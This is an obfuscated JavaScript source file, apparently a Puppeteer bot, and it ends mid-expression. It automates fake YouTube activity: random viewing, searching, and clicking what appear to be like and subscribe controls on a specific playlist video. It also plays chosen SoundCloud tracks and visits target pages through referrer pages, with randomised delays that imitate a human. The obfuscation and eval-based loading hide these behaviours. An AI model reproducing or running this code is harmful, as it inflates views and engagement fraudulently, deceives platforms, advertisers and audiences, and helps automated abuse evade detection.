const Y = d,
  X = c,
  W = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x38 * -0x32 + -0xe5a * 0x2 + 0x11c5))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x2 * -0xdb8 + -0x243d * 0x1 + 0x3fad), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x23be + -0x1094 + -0xb5 * -0x4a);
    let h = e[f];
    if (b['DOUAOP'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x80e + -0x510 + 0x68f * 0x2, s, t, u = -0x13 * 0xeb + -0x34 * 0x3d + -0x443 * -0x7; t = n['charAt'](u++); ~t && (s = r % (-0x439 * -0x2 + -0x13bc + 0xb4e) ? s * (0x243d * -0x1 + 0x17ef + 0xc8e) + t : t, r++ % (-0x52f * 0x1 + 0x4 * 0x9af + -0x2189)) ? p += String['fromCharCode'](-0x1595 + 0x1 * -0x234b + 0xb93 * 0x5 & s >> (-(-0x1c78 + 0x237f + -0x705) * r & 0x5 * 0x347 + 0xdcf + -0x2 * 0xf16)) : 0x1d * -0xf1 + 0x4 * -0x3e6 + 0x2ae5) {
          t = o['indexOf'](t);
        }
        for (let v = -0x30a * -0x9 + -0x1bb2 + 0x58, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x16e * -0xe + -0x10c9 * -0x2 + 0xd * -0x41e))['slice'](-(0x9 * -0x3d5 + 0x581 * 0x5 + 0x6fa));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1b0a + 0x2682 + -0xb78 * 0x1,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x19a9 + -0xb * 0x2c + 0x1b8d; u < -0x1 * -0x25e9 + -0xa8e + -0x1a5b; u++) {
          p[u] = u;
        }
        for (u = -0xa8f * 0x3 + 0x2263 * -0x1 + 0x70 * 0x97; u < -0x533 * -0x6 + -0x1790 + -0x3 * 0x236; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x77 * -0x4c + 0x4f7 + -0x274b), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1193 + 0x1a5 * -0x4 + 0x1827, q = 0x347 * 0xb + 0x10ec + -0x34f9;
        for (let v = 0x190c + -0x1d * 0xfb + -0x11 * -0x33; v < n['length']; v++) {
          u = (u + (0x212 + -0x71 * 0x3 + 0xa * -0x13)) % (-0x3 * 0x62f + -0x99 * 0x3b + -0x4 * -0xdb4), q = (q + p[u]) % (0x2571 + -0x21f1 + -0xa * 0x40), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x25ab + 0x1051 * -0x1 + -0x145a)]);
        }
        return t;
      };
      b['aHNeir'] = m, c = arguments, b['DOUAOP'] = !![];
    }
    const j = e[0xd5a * -0x1 + -0x7 * -0xdb + 0x41 * 0x1d],
      k = f + j,
      l = c[k];
    return !l ? (b['UGWIyo'] === undefined && (b['UGWIyo'] = !![]), h = b['aHNeir'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x1f1b * 0x1 + 0x1 * 0xe863 + -0x5418 + (-0x40bf + 0x1 * -0x69df + 0x729b * 0x2) * random()) : await standardWaitForNetIdle(f), await wait(-0x1c78 + 0x237f + 0xc81 + (0x5 * 0x68e + 0x1b9e + -0x1c * 0xc3) * random()), 0x1d * -0xf1 + 0x4 * -0x3e6 + 0x2ae6;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x23be + -0x1094 + -0xb5 * -0x4a);
    let h = e[f];
    if (c['tydMtw'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x80e + -0x510 + 0x68f * 0x2, r, s, t = -0x13 * 0xeb + -0x34 * 0x3d + -0x443 * -0x7; s = m['charAt'](t++); ~s && (r = q % (-0x439 * -0x2 + -0x13bc + 0xb4e) ? r * (0x243d * -0x1 + 0x17ef + 0xc8e) + s : s, q++ % (-0x52f * 0x1 + 0x4 * 0x9af + -0x2189)) ? o += String['fromCharCode'](-0x1595 + 0x1 * -0x234b + 0xb93 * 0x5 & r >> (-(-0x1c78 + 0x237f + -0x705) * q & 0x5 * 0x347 + 0xdcf + -0x2 * 0xf16)) : 0x1d * -0xf1 + 0x4 * -0x3e6 + 0x2ae5) {
          s = n['indexOf'](s);
        }
        for (let u = -0x30a * -0x9 + -0x1bb2 + 0x58, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x16e * -0xe + -0x10c9 * -0x2 + 0xd * -0x41e))['slice'](-(0x9 * -0x3d5 + 0x581 * 0x5 + 0x6fa));
        }
        return decodeURIComponent(p);
      };
      c['KgMMTP'] = i, b = arguments, c['tydMtw'] = !![];
    }
    const j = e[-0x1b0a + 0x2682 + -0xb78 * 0x1],
      k = f + j,
      l = b[k];
    return !l ? (h = c['KgMMTP'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x30a * -0x9 + -0x1bb2 + 0x13e0), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x16e * -0xe + -0x10c9 * -0x2 + 0xb * -0x4df;
}
async function randomWait() {
  return await wait(0x9 * -0x3d5 + 0x581 * 0x5 + 0x1a80 + (-0x1b0a + 0x2682 + -0x810 * -0x1) * random()), -0x19a9 + -0xb * 0x2c + 0x1b8e;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1 * -0x25e9 + -0xa8e + -0x1b5b, -0xa8f * 0x3 + 0x2263 * -0x1 + 0x7 * 0x971), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x1abd * -0xe + -0x11ab8 + -0x3 * -0x2f96) * getRandomInt(-0x77 * -0x4c + 0x4f7 + -0x2849, -0x1193 + 0x1a5 * -0x4 + 0x182c), h)), 0x347 * 0xb + 0x10ec + -0x34f8;
}

function a() {
  const bk = [
    'CmoiW7BdMSkbWQS',
    '28\x20Mobile\x20',
    'pts/by-sit',
    'BePt',
    'z2vYlwPZltzJzG',
    'Aw9YlwvUz2LUzq',
    'ACoHEHKICdi',
    'e/*',
    'ksbbChbSzvDLyG',
    'ap-2022-76',
    'u8kmW7ddNSkaWRFcVG',
    'necraft.ne',
    'zwfZEwzVCMSUBW',
    'WP4hW4BcLufGW5TvxNO',
    'y2XVC2u',
    'getAttribu',
    'C2v0qxr0CMLIDq',
    'lwDYAwqTCM93',
    'CMCVzw4VC2nYAq',
    'xCkvW6CHdJ7cKaneDq'
  ];
  a = function() {
    return bk;
  };
  return a();
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x190c + -0x1d * 0xfb + -0x11 * -0x33;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x212 + -0x71 * 0x3 + 0xa * -0x13]['split']('\x20');
    for (let k = -0x3 * 0x62f + -0x99 * 0x3b + -0xe * -0x3d8; k < i['length']; k += 0x2571 + -0x21f1 + -0x3 * 0x12a)
      j += i[k] * h[i[k + (0x25ab + 0x1051 * -0x1 + -0x1559)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const R = c,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0xd5a * -0x1 + -0x7 * -0xdb + 0x3d * 0x1f)['map'](l => Array['from'](l['children']))['flat'](0x15df + 0xe8 + -0x16c6)['map'](l => l['childNodes'][-0xf1b + 0x3 * -0xb3f + 0x29 * 0x131]['childNodes'][-0x9 * -0x227 + 0x80 + -0x13df * 0x1]['childNodes'][0x2 * 0x137d + -0x2065 + -0x1a5 * 0x4]['childNodes'][-0xe9f + -0xfbe + 0x3 * 0xa1f]['childNodes'][-0xd6e + -0x2 * -0x12a + 0x1 * 0xb1b]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])][R(0x10) + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0xa84 + 0x148f + -0x623, 0x76f + 0x9 * 0x2fb + -0xeba)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x98 + -0x3735 + 0x7135);
  const h = await getMaxTime(f),
    i = Math['min']((0x1bc35 + -0x13845 * -0x1 + -0x20a1a) * getRandomInt(0xb5 * 0x2f + -0x1b5b + 0x5de * -0x1, -0x548 + -0x15bd + -0x2 * -0xd85), h);
  return await wait(i), 0x5 * -0x293 + -0x4c5 * -0x3 + -0x16f;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const S = c;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + S(0x11)))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1caa + -0x1008 + -0xca2]['children'][0x1922 * 0x1 + -0x1b5d + 0x1 * 0x23b]['children'][0x1 * -0x1ea1 + -0x1 * -0x2272 + -0x3d1 * 0x1]['children'][-0x8 * -0x43f + 0x2047 + -0x423f]['children'][0x2201 + 0x13f2 + -0x35f3]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1 * -0x17d + 0x176a + 0x18e6 * -0x1;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x24ef + 0x1a56 + 0x61 * 0x1d + (-0xe7b * -0x1 + -0xb00 + -0x349) * random()
  }), await wait(0x34f * -0x1 + -0x559 + 0x1c * 0x61 + (0x1 * -0x6c5 + -0x7a9 + -0x7cd * -0x2) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1 * -0x264f + -0x5 * -0xac + 0x22f5]['childNodes'][-0x3 * -0x419 + 0x281 * -0x5 + 0x3b * 0x1]['childNodes'][0x11f5 + -0x53 * -0x71 + 0x433 * -0xd]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1 * 0x789 + 0x1451 + -0x16b * 0x9]['childNodes'][-0x144d + 0x43f * 0x9 + -0x8f5 * 0x2]['childNodes'][-0x1851 + -0x544 * 0x1 + 0x1d97]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1b7a + 0x15dd + 0x59e),
          r = 0xb * -0x2b + 0x1a5 * -0xb + 0x13f0;
        for (let u = 0xb * -0x220 + -0xc * -0x22d + -0x2bc; u < q['length']; u += -0xb9a + 0x15d6 + -0xbb * 0xe)
          r += q[u] * k[q[u + (0x1164 + -0xd23 + 0x20 * -0x22)]];
        return r;
      }(n);
  });
  await wait((-0x3 * -0xf7f + 0x66a2 + 0x2d * -0x203) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x51ff * 0x1 + 0xcdb9 + -0x1 * -0x6ea6) * getRandomInt(0x46a * 0x1 + 0x1 * 0x1589 + -0xa2 * 0x29, 0xd5 * 0x25 + -0x8 * 0x4df + 0x839), h + (0x2310 + 0x1bfd + -0x2b85));
  return await wait(i), 0x6eb * 0x2 + -0x1 * -0x2045 + -0x2e1a;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x23be + -0x1094 + -0xb5 * -0x4a);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function keyWatch(f) {
  const T = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x2331 + 0x1 * -0x1d24 + 0x4055), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + T(0x13, 'ToAc') + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x2642 + 0x547 * 0x4 + 0x2 * 0xe6f + (-0xb48 + 0x509 + 0xa27) * Math['random']());
    });
  }, 0x2bda + 0x1fb7 + -0x5 * 0x9a5);
  await wait(0x889bb + 0x2e3c * 0x2c + 0x1 * -0xbe82b);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x44bd + -0x5 * 0x3c79 + 0x25d7a * 0x1) * getRandomInt(-0x2593 * 0x1 + 0x42f * 0x1 + 0x2168, -0x2 * 0x1331 + -0x3fd * -0x1 + 0x227e)), clearInterval(h), -0x16ef + -0x1171 + 0x2861;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x1 * 0x222b + -0x1aad * -0x1 + -0x3cd8;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1 * -0x1385 + 0x7b6 + 0x572 * -0x5;
    await randomWait();
  }
  return 0x9ce * -0x1 + -0x1003 * 0x2 + 0x29d5;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1c2e + -0x2 * -0xa96 + -0x315a + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x18bc * -0x1 + -0x1 * -0x1548 + -0x11 * -0x34 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1 * -0x7f3 + 0x451 * -0x5 + 0x5 * 0x2ba + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x17c * -0x15 + 0x24ae + -0x43da;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x1 * 0xda35 + 0x760d + 0xa07a * -0x1 + getRandomInt(0x396b + -0x476e + 0x1 * 0x489b, 0xde3e + -0x2 * 0x5e2d + 0x534c));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1d6 * 0x9 + 0xb1e + -0x1ba3), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x7f7 * 0x4 + 0x2272 * -0x1 + 0x6 * 0xb0d;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xc16 * 0x3 + 0x1d8c + 0x6b6, 0x18c1 * -0x1 + 0x140c + -0x1 * -0x4e7)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x181f + -0x2 * 0xdfd + 0x3be9 + floor((-0x171 + -0x1f01 * 0x1 + 0x6 * 0x60f) * random()))), log('p2'), log(await s['evaluate'](() => {
        const U = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0xea079afe * 0x1 + -0x50e81d12 + -0x191f7dec),
          -0x49979d + 0x329001 + 0x97079c,
          0xccd4 + -0xead2 * 0x1 + 0x9dfe,
          -0xd * -0xc5 + -0x234b + 0x19ca
        ], y = [
          0x17f8 + 0x1ec6 + 0x5 * -0xaee,
          -0x148 * -0x5 + -0x203 + -0x455,
          0x1a10 + -0x879 + -0x1d * 0x9b,
          0x115d + 0xbf4 + -0x5f * 0x4f
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x107 + -0xa9f + 0xba7)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0xf4 * -0x22 + -0x22ae + 0x246 * 0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0xf * 0x11e + 0x1eeb + -0xe29 * 0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x2 * -0xea0 + -0xb1 + 0x1df1] = A[0x242b + -0x7a8 + 0x1 * -0x1c73] = A[-0x1f9d + 0x1ec1 * 0x1 + 0x1 * 0xdd] = A[-0x192e + 0x12fe + 0x632] = A[-0x73a + 0x16f9 + -0x2 * 0x7de] = A[0x1ae5 + 0x38 * 0x98 + -0x3c21] = A[0x1213 + -0x28c + -0xf82] = A[-0x64 * -0x38 + -0x1 * -0x1e5b + 0x37 * -0xf3] = A[0x138c + 0x84d + -0x1bd2] = A[0xa * -0x47 + 0x123a + -0xf6c] = A[-0x19a6 + -0x417 * -0x5 + 0x53c] = A[-0xcaf + -0x10dd * 0x1 + -0x1 * -0x1d96] = A[-0x12eb * 0x1 + -0x2c * 0xd4 + 0x3766] = A[-0x277 * -0x1 + -0xf62 + -0x1 * -0xcf7] = A[-0x1237 + -0x4 * 0x5c8 + 0x2964] = A[0x7ec + -0x1 * 0x233d + 0xb * 0x27d] = A[-0x1 * 0x1db3 + 0xcc * -0x8 + -0x172 * -0x19] = -0x22e2 + -0xeb9 * -0x2 + 0x570 * 0x1, this['blocks'] = A) : this['blocks'] = [
                -0x443 + 0x200 + 0x243 * 0x1,
                -0x16a1 + -0x7d + 0x171e,
                -0x1bfb + -0x2245 + 0x3e40,
                0x1 * -0x1583 + 0x203a + -0xab7,
                -0x10bb + -0x2200 + 0x32bb,
                -0x1653 + -0x530 + 0x1b83,
                0x2196 + 0x747 + 0x13d * -0x21,
                0x2663 + 0x2474 * 0x1 + -0x4ad7,
                0x1dcb + -0x1ed2 * 0x1 + 0x107,
                0x1ad3 + -0x848 * -0x2 + -0x2b63,
                0xedf + 0x9 * 0x1e4 + 0x1 * -0x1fe3,
                0xdab + -0x2689 * 0x1 + -0x18de * -0x1,
                -0x1 * -0x22d2 + 0x2 * -0x1136 + 0x1 * -0x66,
                -0x3ba + -0x1f48 + 0x2302,
                0x2231 + 0x11bf + -0x33f0,
                0x39a + -0x1505 * 0x1 + 0x27d * 0x7,
                0x1c79 * -0x1 + 0x23af + -0x736
              ], this['h0'] = 0x42068756 + -0x541b55f5 + 0x7959f1a0, this['h1'] = 0x1950777fc + -0x5dbd3e * 0x3ae + 0xb3b48db1, this['h2'] = 0x5 * 0x31e925ab + 0xd1c1be79 * 0x1 + -0x1 * 0x132949dd2, this['h3'] = 0x37df6dd + 0x9061791 * 0x1 + 0x3ae4608, this['h4'] = -0x77a45b3e * 0x2 + 0x2a4ec1de * 0x1 + 0x188ccd68e, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0xcaa + -0x1758 + 0xaae, this['finalized'] = this['hashed'] = -0x1d59 + -0x122 * 0x18 + 0x3889, this['first'] = 0x1ac + 0x10 * 0xfb + -0x3 * 0x5c9;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1 * -0x1051 + 0x72 * -0x38 + -0x89f * -0x1, O = J['length'] || -0x3 * -0xe + -0x2 * -0x1204 + -0x2432, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x75 + 0x7 * 0x17 + -0x116, P[-0x7 * -0x17 + 0x4ab + -0x54c] = this['block'], P[-0x16d1 + -0x53 * 0x4c + -0xf * -0x32b] = P[-0x31 * -0x1e + -0x4e9 * 0x7 + 0x5 * 0x5ba] = P[-0x2ff * 0x5 + -0x16ef + 0x25ec] = P[0x43 * -0x3d + 0x371 * -0x9 + 0x2ef3] = P[0x165a + -0x122e + -0x428] = P[-0x1050 + 0x1 * 0x137b + 0x193 * -0x2] = P[-0x9 * 0x2a9 + 0x2 * 0x1c6 + 0x146b] = P[-0x4 * 0x6bc + 0xd01 + 0xdf6] = P[0x4 * 0x11b + 0xdb * 0x1e + 0x1 * -0x1e0e] = P[-0xf6b + 0x1c90 + 0x347 * -0x4] = P[-0x2540 + -0xeb8 + -0x1 * -0x3402] = P[0x16b3 + 0x279 + -0x1921] = P[-0xae * 0xc + -0x2cc * 0x4 + -0x44 * -0x49] = P[-0x1 * -0x7eb + 0x2573 + -0x2d51] = P[-0x847 + -0xb96 + -0x1 * -0x13eb] = P[-0x1 * 0x1100 + -0xdbd * 0x2 + -0xd * -0x36d] = 0x1 * 0x213f + 0x8c + -0x29 * 0xd3), K) {
                    for (N = this['start']; M < O && N < -0x129d + -0x83 * 0x1f + -0x6f2 * -0x5; ++M)
                      P[N >> -0xe24 + -0x2c5 * -0x1 + 0xb61] |= J[M] << y[-0x9cc + 0x7ed * 0x2 + -0x60b & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x21e3 + -0x2018 + -0x5 * 0x4f; ++M)
                      (L = J['charCodeAt'](M)) < -0x1f43 + 0x1 * 0x1f08 + 0xb * 0x11 ? P[N >> 0x1304 + 0x1241 + 0x1 * -0x2543] |= L << y[0xee7 + 0x1b1d * -0x1 + 0xc39 & N++] : L < 0x13d4 + 0x1 * 0x1ba9 + -0x277d ? (P[N >> -0x128 * 0x2 + 0x14c3 + -0x1271 * 0x1] |= (-0x5c * 0x64 + -0x2 * -0xa7e + 0xfb4 | L >> -0x1 * -0x1118 + 0x4 * -0x569 + 0x492) << y[-0x1cb * 0x7 + -0x1df5 * 0x1 + 0x5 * 0x881 & N++], P[N >> -0x369 * 0x1 + 0x182 * 0xa + 0x1 * -0xba9] |= (-0x149 * 0x1d + -0x1 * -0x970 + -0x1c55 * -0x1 | 0x17 * 0x1a6 + 0x14ba + -0x3 * 0x1377 & L) << y[0x2 * 0x821 + -0x101 * -0x4 + -0x1443 & N++]) : L < 0x86a1 * -0x1 + -0x17924 + 0x2d7c5 * 0x1 || L >= 0x5b9 * -0x1f + 0x525 * 0x4c + 0xa6b ? (P[N >> -0x1e07 + -0x1e55 + 0x3c5e] |= (0x5 * 0x2ab + 0x24b4 + 0x312b * -0x1 | L >> 0x1 * 0x2154 + 0x15ff + -0x3747) << y[-0x1030 + 0xe67 + -0x2e * -0xa & N++], P[N >> 0x19b9 + -0x1ad2 * -0x1 + -0x1 * 0x3489] |= (0x191b + 0x43 * -0x6 + -0x1709 | L >> 0x1 * -0x122b + -0x2f2 * -0x1 + 0xf3f & -0x1394 + -0x15 * -0xa3 + 0x674) << y[-0x3ee * 0x2 + 0x1b60 + 0x1381 * -0x1 & N++], P[N >> -0x164f + -0x29 * -0x8 + 0x1509 * 0x1] |= (-0x1 * 0x179b + 0x2548 + -0xd2d * 0x1 | 0x3f4 * 0x2 + -0x965 + 0xde * 0x2 & L) << y[-0x142e + 0xb * -0x2ba + 0x322f & N++]) : (L = 0x1d0dc + 0x8070 + 0x2 * -0xa8a6 + ((-0xca1 * -0x1 + -0x6e1 + -0x1c1 & L) << 0x29e + 0x3 * 0x190 + -0x744 | -0x146 * -0x16 + 0x14f * -0x9 + 0x61f * -0x2 & J['charCodeAt'](++M)), P[N >> 0x1 * -0xaf1 + -0x189 * -0x5 + -0x1a3 * -0x2] |= (0x37 + -0x1cf * 0x5 + 0x9c4 | L >> 0x7 * 0x3b + -0x11a2 + 0x1017) << y[-0x124 * -0x1 + -0x13 * 0x15a + -0x4e9 * -0x5 & N++], P[N >> 0xc1b * 0x1 + 0x2254 + 0x2e6d * -0x1] |= (0x911 + 0x1514 + 